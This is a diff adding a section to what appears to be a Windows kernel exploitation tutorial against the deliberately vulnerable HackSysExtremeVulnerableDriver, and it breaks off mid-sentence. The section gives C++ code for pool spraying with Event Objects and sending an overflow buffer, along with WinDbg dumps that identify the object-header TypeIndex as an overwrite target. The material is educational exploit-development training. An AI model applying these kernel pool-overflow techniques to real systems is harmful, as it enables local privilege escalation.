@@ -224,11 +224,261 @@ HANDLE CreateEventA(
 );
 ```
 
-What's most important for us now, is finding out what we need to overwrite in this object to get code execution when the corrupted Event Object is freed. We'll go ahead and spray the same amount of objects that FuzzySec and r0otki7 did, 
+What's most important for us now, is finding out what we need to overwrite in this object to get code execution when the corrupted Event Object is freed. We'll go ahead and spray a similar amount of objects that FuzzySec and r0otki7 did, 
 + 10,000 to fill the holes in the fragmented pool
 + 5,000 to create a nice long contiguous block of Event Objects
 
 Our code now looks like this: 
+```cpp
+#include <iostream>
+#include <vector>
+#include <Windows.h>
+
+using namespace std;
+
+#define DEVICE_NAME         "\\\\.\\HackSysExtremeVulnerableDriver"
+#define IOCTL               0x22200B
+
+vector<HANDLE> defragment_handles;
+vector<HANDLE> sequential_handles;
+
+HANDLE grab_handle() {
+
+    HANDLE hFile = CreateFileA(DEVICE_NAME,
+        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        cout << "[!] No handle to HackSysExtremeVulnerableDriver\n";
+        exit(1);
+    }
+
+    cout << "[>] Grabbed handle to HackSysExtremeVulnerableDriver: " << hex
+        << hFile << "\n";
+
+    return hFile;
+}
+
+void spray_pool() {
+
+    cout << "[>] Spraying pool to defragment...\n";
+    for (int i = 0; i < 10000; i++) {
+
+        HANDLE result = CreateEvent(NULL,
+            0,
+            0,
+            L"");
+
+        if (!result) {
+            cout << "[!] Error allocating Event Object during defragmentation\n";
+            exit(1);
+        }
+
+        defragment_handles.push_back(result);
+    }
+    cout << "[>] Defragmentation spray complete.\n";
+    cout << "[>] Spraying sequential allocations...\n";
+    for (int i = 0; i < 10000; i++) {
+
+        HANDLE result = CreateEvent(NULL,
+            0,
+            0,
+            L"");
+
+        if (!result) {
+            cout << "[!] Error allocating Event Object during sequential.\n";
+            exit(1);
+        }
+
+        sequential_handles.push_back(result);
+    }
+    
+    cout << "[>] Sequential spray complete.\n";
+}
+
+void send_payload(HANDLE hFile) {
+    
+    ULONG payload_len = 0x1F8;
+
+    LPVOID input_buff = VirtualAlloc(NULL,
+        payload_len + 0x1,
+        MEM_RESERVE | MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE);
+
+    memset(input_buff, '\x42', payload_len);
+
+    cout << "[>] Sending buffer size of: " << dec << payload_len << "\n";
+
+    DWORD bytes_ret = 0;
+
+    int result = DeviceIoControl(hFile,
+        0x22200F,
+        input_buff,
+        payload_len,
+        NULL,
+        0,
+        &bytes_ret,
+        NULL);
+
+    if (!result) {
+
+        cout << "[!] DeviceIoControl failed!\n";
+
+    }
+}
+
+int main() {
+
+    HANDLE hFile = grab_handle();
+
+    spray_pool();
+
+    send_payload(hFile);
+
+    return 0;
+}
+```
+
+Take note that we're storing the handles to each Event Object in a vector so that we can access those later. 
+
+Let's spray our objects and then allocate our kernel buffer and see what the page looks like that our kernel buffer ends up being allocated on. We still have the same breakpoint from before, right after the `memcpy` operation. At this point the kernel buffer pointer is still in `eax` don't forget, so I just want to subtract `0x1000` from it because thats a small page size and then advance by just plugging that right in to the `!pool` command we get the whole page's allocation information:
+```
+kd> !pool 8628b008-0x1000
+Pool page 8628a008 region is Nonpaged pool
+*8628a000 size:   40 previous size:    0  (Allocated) *Even (Protected)
+		Pooltag Even : Event objects
+ 8628a040 size:   80 previous size:   40  (Free)       b.2.
+ 8628a0c0 size:   40 previous size:   80  (Allocated)  Even (Protected)
+ 8628a100 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a140 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a180 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a1c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a200 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a240 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a280 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a2c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a300 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a340 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a380 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a3c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a400 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a440 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a480 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a4c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a500 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a540 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a580 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a5c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a600 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a640 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a680 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a6c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a700 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a740 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a780 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a7c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a800 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a840 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a880 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a8c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a900 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a940 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a980 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628a9c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628aa00 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628aa40 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628aa80 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628aac0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ab00 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ab40 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ab80 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628abc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ac00 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ac40 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ac80 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628acc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ad00 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ad40 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ad80 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628adc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ae00 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ae40 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628ae80 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628aec0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628af00 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628af40 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628af80 size:   40 previous size:   40  (Allocated)  Even (Protected)
+ 8628afc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
+```
+
+That looks pretty nice. We get a nice contiguous block of Event Objects just as we expected (bit weird that there's a `0x80` byte hole in there...). 
+
+The next thing we need to do, is examine the constituent parts of these Event Objects to find our overwrite target. I like to take a look at the memory pane of and then, following along with the cited blogposts, parse out the meaning of the byte values. Here is the memory view for one of the Event Object allocations:
+```
+8628afc0 08 00 08 04 45 76 65 ee 00 00 00 00 40 00 00 00  ....Eve.....@...
+8628afd0 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00  ................
+8628afe0 00 00 00 00 0c 00 08 00 40 f9 37 86 00 00 00 00  ........@.7.....
+8628aff0 01 00 04 34 00 00 00 00 f8 af 28 86 f8 af 28 86
+```
+
+We can start parsing this by taking a look at the pool header:
+```
+kd> dt nt!_POOL_HEADER 8628afc0 
+   +0x000 PreviousSize     : 0y000001000 (0x8)
+   +0x000 PoolIndex        : 0y0000000 (0)
+   +0x002 BlockSize        : 0y000001000 (0x8)
+   +0x002 PoolType         : 0y0000010 (0x2)
+   +0x000 Ulong1           : 0x4080008
+   +0x004 PoolTag          : 0xee657645
+   +0x004 AllocatorBackTraceIndex : 0x7645
+   +0x006 PoolTagHash      : 0xee65
+```
+
+This looks pretty familiar to what we've done, obviously the `PoolTag` is different, but so is the `Ulong1` value and you can examine the binary constituent parts that lead to its formulation. Next we'll look at the `OBJECT_HEADER_QUOTA_INFO` which starts at offset `0x8` from the beginning of our allocation and you can match it up with the bytes in the memory view:
+```
+kd> dt nt!_OBJECT_HEADER_QUOTA_INFO 8628afc0+0x8
+   +0x000 PagedPoolCharge  : 0
+   +0x004 NonPagedPoolCharge : 0x40
+   +0x008 SecurityDescriptorCharge : 0
+   +0x00c SecurityDescriptorQuotaBlock : (null) 
+```
+
+So far, none of these things can be changed by our overwrite. Our overwrite has to keep all of this data intact so we'll have to write these values into our input buffer. Next, we'll finally start to approach our overwrite target when we parse out the `OBJECT_HEADER`:
+```
+kd> dt nt!_OBJECT_HEADER 8628afc0 + 8 + 10
+   +0x000 PointerCount     : 0n1
+   +0x004 HandleCount      : 0n1
+   +0x004 NextToFree       : 0x00000001 Void
+   +0x008 Lock             : _EX_PUSH_LOCK
+   +0x00c TypeIndex        : 0xc ''
+   +0x00d TraceFlags       : 0 ''
+   +0x00e InfoMask         : 0x8 ''
+   +0x00f Flags            : 0 ''
+   +0x010 ObjectCreateInfo : 0x8637f940 _OBJECT_CREATE_INFORMATION
+   +0x010 QuotaBlockCharged : 0x8637f940 Void
+   +0x014 SecurityDescriptor : (null) 
+   +0x018 Body             : _QUAD
+```
+
+This is where things start to get interesting as the `TypeIndex` value right now is set to `0xc`. `0xc` is actually an array index value, like array[`0xc`]. This array, is called the `ObTypeIndexTable` and it is filled with pointers which define `OBJECT_TYPEs`. This is actually really cool in my opinion because we can test this out. Let's first dump all the pointers stored in the `ObTypeIndexTable`. 
+```
+kd> dd nt!ObTypeIndexTable
+82997760  00000000 bad0b0b0 84f46728 84f46660
+82997770  84f46598 84fedf48 84fede08 84fedd40
+82997780  84fedc78 84fedbb0 84fedae8 84fed410
+82997790  85053520 8504f9c8 8504f900 8504f838
+829977a0  8503f9c8 8503f900 8503f838 84ffb9c8
+829977b0  84ffb900 84ffb838 84fef780 84fef6b8
+829977c0  84fef5f0 8503b838 8503b770 8503b6a8
+829977d0  85057590 850573a0 84ff3ca0 84ff3bd8
+```
+
+Now the adjustment we need to make is to poke holes in this contiguous block so that when we get our buffer allocated the allocator slides it right between Event Objects. We know that it takes 8 Event Objects being freed to make a `0x200`-sized hole, so 
+
 
 
 
